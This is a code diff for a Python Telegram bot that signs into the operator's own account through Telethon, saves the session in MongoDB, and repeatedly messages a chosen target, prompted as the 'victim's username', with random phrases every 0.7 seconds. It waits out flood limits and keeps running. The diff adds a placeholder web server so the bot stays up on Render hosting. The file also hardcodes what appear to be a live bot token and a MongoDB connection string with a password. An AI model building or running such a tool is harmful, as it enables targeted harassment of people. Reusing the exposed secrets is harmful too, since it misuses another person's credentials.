@@ -1,5 +1,7 @@
 import asyncio
 import random
+import os
+from aiohttp import web
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import FloodWaitError, SessionPasswordNeededError
@@ -10,7 +12,7 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from motor.motor_asyncio import AsyncIOMotorClient
 
-# --- НАСТРОЙКИ (УЖЕ ЗАПОЛНЕНО) ---
+# --- НАСТРОЙКИ ---
 API_TOKEN = '8644779172:AAFJJCPaD-btolCWwcSMkf-iCunFhFDMq14'
 MONGO_URL = "mongodb+srv://Redoxin42_db_user:Redox@cluster0.rsebeqg.mongodb.net/?appName=Cluster0"
 
@@ -221,11 +223,21 @@ class States(StatesGroup):
 user_clients = {}
 active_tasks = {}
 
+# --- ВЕБ-СЕРВЕР ДЛЯ RENDER ---
+async def handle(request):
+    return web.Response(text="Bot is running!")
+
+async def start_web_server():
+    app = web.Application()
+    app.router.add_get("/", handle)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, '0.0.0.0', int(os.environ.get("PORT", 10000)))
+    await site.start()
+
+# --- ЛОГИКА БОТА (AIOGRAM) ---
 def get_kb():
-    buttons = [
-        [types.KeyboardButton(text="Запустить спам")],
-        [types.KeyboardButton(text="Остановить все")]
-    ]
+    buttons = [[types.KeyboardButton(text="Запустить спам")], [types.KeyboardButton(text="Остановить все")]]
     return types.ReplyKeyboardMarkup(keyboard=buttons, resize_keyboard=True)
 
 @dp.message(Command("start"))
@@ -233,15 +245,14 @@ async def cmd_start(message: types.Message, state: FSMContext):
     uid = message.from_user.id
     saved = await sessions_col.find_one({"_id": uid})
     if saved:
-        await message.answer("✅ Подключаюсь к облачной сессии...")
         try:
             client = TelegramClient(StringSession(saved['session']), saved['api_id'], saved['api_hash'])
             await client.connect()
             user_clients[uid] = client
-            await message.answer("Готово! Что делаем?", reply_markup=get_kb())
+            await message.answer("✅ Сессия восстановлена!", reply_markup=get_kb())
             await state.set_state(States.main_menu)
-        except Exception as e:
-            await message.answer(f"Ошибка: {e}. Начнем заново. API ID:")
+        except:
+            await message.answer("Введи API ID:")
             await state.set_state(States.api_id)
     else:
         await message.answer("Введи API ID:")
@@ -271,8 +282,7 @@ async def get_phone(message: types.Message, state: FSMContext):
         await state.update_data(phone=phone, hash=res.phone_code_hash)
         await message.answer("Код из ТГ:")
         await state.set_state(States.code)
-    except Exception as e:
-        await message.answer(f"Ошибка: {e}")
+    except Exception as e: await message.answer(f"Ошибка: {e}")
 
 @dp.message(States.code)
 async def get_code(message: types.Message, state: FSMContext):
@@ -283,47 +293,32 @@ async def get_code(message: types.Message, state: FSMContext):
     try:
         await client.sign_in(data['phone'], code, phone_code_hash=data['hash'])
         session_str = client.session.save()
-        await sessions_col.update_one(
-            {"_id": uid},
-            {"$set": {"session": session_str, "api_id": int(data['api_id']), "api_hash": data['api_hash']}},
-            upsert=True
-        )
-        await message.answer("✅ Аккаунт привязан!", reply_markup=get_kb())
+        await sessions_col.update_one({"_id": uid}, {"$set": {"session": session_str, "api_id": int(data['api_id']), "api_hash": data['api_hash']}}, upsert=True)
+        await message.answer("✅ Готово!", reply_markup=get_kb())
         await state.set_state(States.main_menu)
     except SessionPasswordNeededError:
-        await message.answer("Введи пароль 2FA:")
+        await message.answer("2FA Пароль:")
         await state.set_state(States.password)
 
 @dp.message(States.password)
-async def get_password(message: types.Message, state: FSMContext):
-    uid = message.from_user.id
-    client = user_clients[uid]
-    data = await state.get_data()
-    try:
-        await client.sign_in(password=message.text.strip())
-        session_str = client.session.save()
-        await sessions_col.update_one(
-            {"_id": uid},
-            {"$set": {"session": session_str, "api_id": int(data['api_id']), "api_hash": data['api_hash']}},
-            upsert=True
-        )
-        await message.answer("✅ Готово!", reply_markup=get_kb())
-        await state.set_state(States.main_menu)
-    except Exception as e:
-        await message.answer(f"Ошибка: {e}")
+async def get_pass(message: types.Message, state: FSMContext):
+    uid, client, data = message.from_user.id, user_clients[message.from_user.id], await state.get_data()
+    await client.sign_in(password=message.text.strip())
+    await sessions_col.update_one({"_id": uid}, {"$set": {"session": client.session.save(), "api_id": int(data['api_id']), "api_hash": data['api_hash']}}, upsert=True)
+    await message.answer("✅ Вход выполнен!", reply_markup=get_kb())
+    await state.set_state(States.main_menu)
 
 @dp.message(F.text == "Запустить спам", States.main_menu)
 async def ask_target(message: types.Message, state: FSMContext):
-    await message.answer("Кому спамим? (Username):")
+    await message.answer("Username жертвы:")
     await state.set_state(States.spaming)
 
 @dp.message(States.spaming)
 async def start_spam(message: types.Message, state: FSMContext):
-    target = message.text.strip()
-    uid = message.from_user.id
+    target, uid = message.text.strip(), message.from_user.id
     active_tasks[uid] = True
     asyncio.create_task(do_spam(uid, target))
-    await message.answer(f"🚀 Погнали в {target}!", reply_markup=get_kb())
+    await message.answer(f"🚀 Начали!")
     await state.set_state(States.main_menu)
 
 @dp.message(F.text == "Остановить все")
@@ -335,13 +330,14 @@ async def do_spam(uid, target):
     client = user_clients[uid]
     while active_tasks.get(uid):
         try:
-            msg = random.choice(phrases)
-            await client.send_message(target, msg)
+            await client.send_message(target, random.choice(phrases))
             await asyncio.sleep(0.7)
-        except FloodWaitError as e:
-            await asyncio.sleep(e.seconds)
-        except Exception:
-            break
+        except FloodWaitError as e: await asyncio.sleep(e.seconds)
+        except: break
+
+async def main():
+    await start_web_server()  # Запускаем "пустой" сайт, чтобы Render не ругался
+    await dp.start_polling(bot)
 
 if __name__ == "__main__":
-    asyncio.run(dp.start_polling(bot))
+    asyncio.run(main())
